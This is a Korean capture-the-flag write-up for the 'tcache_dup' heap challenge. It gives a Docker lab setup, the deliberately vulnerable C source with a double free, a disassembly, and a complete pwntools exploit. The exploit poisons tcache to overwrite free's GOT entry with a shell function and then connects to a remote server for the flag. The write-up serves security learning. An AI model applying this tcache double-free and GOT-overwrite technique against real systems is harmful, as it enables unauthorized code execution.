# Exercise: tcache_dup

**실습 환경**

```
FROM ubuntu:18.04

ENV PATH="${PATH}:/usr/local/lib/python3.6/dist-packages/bin"
ENV LC_CTYPE=C.UTF-8

RUN apt update
RUN apt install -y \\
    gcc \\
    git \\
    python3 \\
    python3-pip \\
    ruby \\
    sudo \\
    tmux \\
    vim \\
    wget

# install pwndbg
WORKDIR /root
RUN git clone <https://github.com/pwndbg/pwndbg>
WORKDIR /root/pwndbg
RUN git checkout 2023.03.19
RUN ./setup.sh

# install pwntools
RUN pip3 install --upgrade pip
RUN pip3 install pwntools

# install one_gadget command
RUN gem install one_gadget -v 1.6.2

WORKDIR /root
COPY . /root

```

```bash
$ IMAGE_NAME=ubuntu1804 CONTAINER_NAME=my_container; \\
docker build . -t $IMAGE_NAME; \\
docker run -d -t --privileged --name=$CONTAINER_NAME $IMAGE_NAME; \\
docker exec -it -u root $CONTAINER_NAME bash

```

**실습 코드**

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

char *ptr[10];

void alarm_handler() {
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

int create(int cnt) {
    int size;

    if (cnt > 10) {
        return -1;
    }
    printf("Size: ");
    scanf("%d", &size);

    ptr[cnt] = malloc(size);

    if (!ptr[cnt]) {
        return -1;
    }

    printf("Data: ");
    read(0, ptr[cnt], size);
}

int delete() {
    int idx;

    printf("idx: ");
    scanf("%d", &idx);

    if (idx > 10) {
        return -1;
    }

    free(ptr[idx]);
}

void get_shell() {
    system("/bin/sh");
}

int main() {
    int idx;
    int cnt = 0;

    initialize();

    while (1) {
        printf("1. Create\n");
        printf("2. Delete\n");
        printf("> ");
        scanf("%d", &idx);

        switch (idx) {
            case 1:
                create(cnt);
                cnt++;
                break;
            case 2:
                delete();
                break;
            default:
                break;
        }
    }

    return 0;
}
```

**코드분석**

일단 `get_shell()` 함수로 문제에서 리턴 주소 위치는 내어줬다.

이 문제도 `free()` 중복 호출로 DFB 를 일으키고 쉘을 얻는 문제로 보인다.

**동적분석**

```c
pwndbg> disassem main
Dump of assembler code for function main:
   0x0000000000400ac1 <+0>:     push   rbp
   0x0000000000400ac2 <+1>:     mov    rbp,rsp
   0x0000000000400ac5 <+4>:     sub    rsp,0x10
   0x0000000000400ac9 <+8>:     mov    rax,QWORD PTR fs:0x28
   0x0000000000400ad2 <+17>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000000000400ad6 <+21>:    xor    eax,eax
   0x0000000000400ad8 <+23>:    mov    DWORD PTR [rbp-0xc],0x0
   0x0000000000400adf <+30>:    mov    eax,0x0
   0x0000000000400ae4 <+35>:    call   0x400914 <initialize>
   0x0000000000400ae9 <+40>:    mov    edi,0x400bf3
   0x0000000000400aee <+45>:    call   0x400740 <puts@plt>
   0x0000000000400af3 <+50>:    mov    edi,0x400bfd
   0x0000000000400af8 <+55>:    call   0x400740 <puts@plt>
   0x0000000000400afd <+60>:    mov    edi,0x400c07
   0x0000000000400b02 <+65>:    mov    eax,0x0
   0x0000000000400b07 <+70>:    call   0x400770 <printf@plt>
   0x0000000000400b0c <+75>:    lea    rax,[rbp-0x10]
   0x0000000000400b10 <+79>:    mov    rsi,rax
   0x0000000000400b13 <+82>:    mov    edi,0x400bdb
   0x0000000000400b18 <+87>:    mov    eax,0x0
   0x0000000000400b1d <+92>:    call   0x4007e0 <__isoc99_scanf@plt>
   0x0000000000400b22 <+97>:    mov    eax,DWORD PTR [rbp-0x10]
   0x0000000000400b25 <+100>:   cmp    eax,0x1
   0x0000000000400b28 <+103>:   je     0x400b31 <main+112>
   0x0000000000400b2a <+105>:   cmp    eax,0x2
   0x0000000000400b2d <+108>:   je     0x400b41 <main+128>
   0x0000000000400b2f <+110>:   jmp    0x400b4c <main+139>
   0x0000000000400b31 <+112>:   mov    eax,DWORD PTR [rbp-0xc]
   0x0000000000400b34 <+115>:   mov    edi,eax
   0x0000000000400b36 <+117>:   call   0x400970 <create>
   0x0000000000400b3b <+122>:   add    DWORD PTR [rbp-0xc],0x1
   0x0000000000400b3f <+126>:   jmp    0x400b4c <main+139>
   0x0000000000400b41 <+128>:   mov    eax,0x0
   0x0000000000400b46 <+133>:   call   0x400a3a <delete>
   0x0000000000400b4b <+138>:   nop
   0x0000000000400b4c <+139>:   jmp    0x400ae9 <main+40>
```

우선 할당된 메모리를 해제하고, key 값을 바꿔줘야한다 생각이 들었다.  
그래서 key 값을 바꿔보려고 +117 +133 에서 브레이크를 걸고 생각을 해보니 key 를 조작할 방법이 보이지 않는다.  
그리고 실습 파일에 같이 받은 libc 버전을 보고 찾아보니, 해당 버전에서는 dfb 처리가 잘 안되어있다고 한다.  
그냥 편하게 free()를 두번 호출해서 편하게 풀면 되는 문제이다.  

<br>

**익스플로잇 코드**
```python
#!/usr/bin/env python3
from pwn import *
import sys

if len(sys.argv) == 3:
    p = remote(sys.argv[1], int(sys.argv[2]))
else:
    p = process('./tcache_dup', env={'LD_PRELOAD': './libc-2.27.so'})

e = ELF('./tcache_dup')
libc = ELF('./libc-2.27.so')

def create(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b': ', str(size).encode())
    p.sendafter(b': ', data)

def delete(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b': ', str(idx).encode())


create(0x10, b'AAAAAAAA')
delete(0)
delete(0)

create(0x10, p64(e.got['free']))
create(0x10, b'BBBBBBBB')
create(0x10, p64(e.symbols['get_shell']))

delete(0)

p.interactive()
```

뒤에는 Partition RELRO 덕에 got 에서 free 가져오고 쉘을 집어넣는게 끝이다.  

<img width="700" height="347" alt="image (22)" src="https://github.com/user-attachments/assets/89b49dcc-dbb9-4b3b-9040-9eb596dff092" />

이제 서버에 날려보면 flag가 나온다.  
